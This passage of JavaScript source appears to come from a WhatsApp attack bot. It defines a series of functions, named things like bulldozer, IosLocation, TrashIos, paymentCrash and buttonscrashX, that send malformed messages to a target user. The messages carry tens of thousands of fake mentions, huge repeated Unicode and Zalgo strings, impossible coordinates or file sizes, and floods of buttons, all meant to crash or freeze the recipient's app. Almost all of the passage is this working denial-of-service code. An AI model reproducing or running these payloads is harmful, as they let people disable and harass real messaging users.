											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    sock.relayMessage(target, messagePayload, {}, { messageId: null });
}

async function protocol5(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "ោ៝".repeat(10000),
        title: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "@newsletter",
            serverMessageId: 1,
            newsletterName: "ϟ"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolxaudio(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mp4",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "X" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function locationInvis(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function IosLocation(target) {
  try {
    const IphoneCrash = "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "\u0003               " + IphoneCrash,
        url: "https://youtube.com"
      }
    }, {
      participant: { jid: target }
    });
  } catch (error) {
    console.error("ERROR SENDING:", error);
  }
}	

async function TrashIos(target, Ptcp = false) {
  await sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "13135550002@s.whatsapp.net",
                  callOutcome: "1"
                }
              ]
            }
          },
          remoteJid: target,
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 9999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            caption: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ"
          },
          placeholderKey: {
            remoteJid: "6289501955295@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "🩸",
            body: "Trash Ios ϟ",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewTtpe: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "https://youtube.com/@dilxzdev",
            mediaUrl: "https://youtube.com/@dilxzdev",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://youtube.com/@dilxzdev"
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    },
    Ptcp ? { participant: { jid: target } } : {}
  );
}


async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function extendetX(target) {
sock.relayMessage(target, {
'extendedTextMessage': {
'text': '.',
'contextInfo': {
'stanzaId': target,
'participant': target,
'quotedMessage': {
							'conversation': '�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green(""));
		};

async function buttoncast(target) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `order_${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER"
        },
        share_payment_status: true
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: buttons,
        messageParamsJson: {
          title: "?",
          body: "#"
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function paymentCrash(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending", 
                order_type: "ORDER"
              },
              share_payment_status: true,
              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ".repeat(4000),
                phone_number: "+6289500000000",
                email: "@iCloud.com",
                organization: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u200B".repeat(10000), 
          body: "GIDEOVA_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}

async function buttonscrashX(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ\n" + "ꦾ".repeat(30000) +
                  "\u0003".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "##",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function ioskeresh(target) {
sock.relayMessage(target, {
'extendedTextMessage': {
'text': '.',
'contextInfo': {
'stanzaId': target,
'participant': target,
'quotedMessage': {
							'conversation': '�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green(""));
		};

async function flowkresh(target) {
  let sections = [];
  for (let i = 0; i < 10; i++) {
